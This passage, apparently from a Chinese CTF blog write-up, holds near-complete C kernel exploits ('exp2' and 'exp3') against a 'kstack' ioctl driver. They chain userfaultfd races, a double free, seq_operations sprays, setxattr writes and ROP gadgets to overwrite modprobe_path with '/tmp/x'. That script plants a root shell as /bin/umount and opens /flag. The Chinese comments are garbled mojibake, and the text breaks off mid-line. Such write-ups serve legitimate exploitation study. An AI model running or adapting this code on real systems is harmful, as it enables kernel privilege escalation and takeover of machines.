class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_push</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_pop</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57ac0002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">push_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">pop_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0002</span>,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">setxattr_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,addr,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_seq_operations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        fd_seq[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">59</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fd_seq,<span class="number">0</span>,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">20</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> ret_value = <span class="number">0</span>;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    fd_kstack = open(<span class="string">&quot;/proc/stack&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set userfaultfd</span></span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_sleep3_handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel_base</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leaking kernel base address\n&quot;</span>);</span><br><span class="line">    prepare_seq_operations();           <span class="comment">// spray kernel addr in heap-0x20</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_push;</span><br><span class="line">    pthread_create(&amp;thr_push, <span class="literal">NULL</span>, push_thread, fault_addr);        <span class="comment">// stop at copy_from_user</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);                    <span class="comment">// kfree</span></span><br><span class="line">    kernel_base = ret_value - single_stop_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// double free</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] creating double free\n&quot;</span>);</span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_pause_handler);</span><br><span class="line">    fault_addr2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr2, userfaultfd_sleep3_handler);</span><br><span class="line">    fault_addr3 = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr3+<span class="number">0x1000</span>, userfaultfd_pause_handler);</span><br><span class="line">    fault_addr4 = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr4+<span class="number">0x1000</span>, userfaultfd_pause_handler);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>) = modprobe_path_addr + kernel_base;            <span class="comment">// aaw: target address</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(fault_addr4+<span class="number">0x1000</span><span class="number">-0x8</span>) = <span class="number">0x782f706d742f</span>;                              <span class="comment">// aaw: value - &quot;/tmp/x&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_pause,thr_pop;</span><br><span class="line">    pthread_create(&amp;thr_pause, <span class="literal">NULL</span>, push_thread, fault_addr);      <span class="comment">// kmalloc</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_pop, <span class="literal">NULL</span>, pop_thread, fault_addr2);        <span class="comment">// first kfree</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);       <span class="comment">// double kfree</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc back</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] arbitrary write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> setxattr1,setxattr2,setxattr3;</span><br><span class="line">    pthread_create(&amp;setxattr1, <span class="literal">NULL</span>, setxattr_thread, fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;setxattr2, <span class="literal">NULL</span>, setxattr_thread, fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">                            <span class="comment">// ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåœ¨è¿™ä¸ªæœŸé—´ï¼Œæ€»æ˜¯ä¼šæœ‰ä¸€ä¸ªdo_fork()çš„è°ƒç”¨ï¼Ÿï¼Ÿï¼Ÿå¯¼è‡´modprobe_pathé‚£ä¸ªå—è¢«æå‰å ç”¨äº†ã€‚</span></span><br><span class="line">    close(fd_seq[<span class="number">59</span>]);      <span class="comment">// æ‰€ä»¥ï¼Œå¢åŠ ä¸€ä¸ªkfree 0x20å¤§å°å †å—çš„æ“ä½œ</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;setxattr3, <span class="literal">NULL</span>, setxattr_thread, fault_addr4+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);       <span class="comment">// è¿™é‡Œè¦sleep 1sï¼Œç»™çº¿ç¨‹ä¸€ç‚¹æ—¶é—´å°†modprobe_pathå†™å®Œ</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">60</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);               <span class="comment">// é˜²æ­¢åç»­ç”³è¯·0x20å¤§å°å †å—æ—¶ç³»ç»Ÿå´©æºƒ</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pause();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp3-1"   >
          <a href="#exp3-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp3-1" class="headerlink" title="exp3"></a>exp3</h3>
      <blockquote>
<p>è·Ÿexp2çš„åŒºåˆ«åœ¨å¦‚ä½•mallocå›double freeçš„å †å—ï¼Œè¿™é‡Œå…ˆç”¨seq_operationsç»“æ„ä½“å ä½å †å—ï¼Œå†ç”¨â€setxattr+userfaultfdâ€è¦†ç›–seq_operations-&gt;startæŒ‡é’ˆï¼Œå®Œæˆæ§åˆ¶æµåŠ«æŒã€‚æœ€åä½¿ç”¨ptregs+ROPä¿®æ”¹modprobe_pathææƒã€‚</p>
</blockquote>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BZIMAGE_ADDR 0xFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_kstack = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* fault_addr;</span><br><span class="line"><span class="keyword">char</span>* fault_addr2;</span><br><span class="line"><span class="keyword">char</span>* fault_addr3;</span><br><span class="line"><span class="keyword">uint64_t</span> fd_seq[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> single_stop_off = <span class="number">0xFFFFFFFF8113BE80</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path_addr = <span class="number">0xFFFFFFFF81C2C541</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> add_rsp_0x1f8_ret = <span class="number">0xffffffff814d51c0</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdx_rdi_ret = <span class="number">0xffffffff8122dd4b</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> pop_rsi_ret = <span class="number">0xffffffff81047a8e</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> mov_qp_rdx_rdi_ret = <span class="number">0xffffffff8121216f</span> - BZIMAGE_ADDR;</span><br><span class="line"><span class="keyword">uint64_t</span> do_task_dead = <span class="number">0xFFFFFFFF8106EBB0</span> - BZIMAGE_ADDR;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_sleep3_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_pause_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    pause();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_push</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_pop</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57ac0002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">push_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,fault_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">pop_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0002</span>,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">setxattr_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,addr,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_seq_operations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        fd_seq[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fd_seq,<span class="number">0</span>,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; 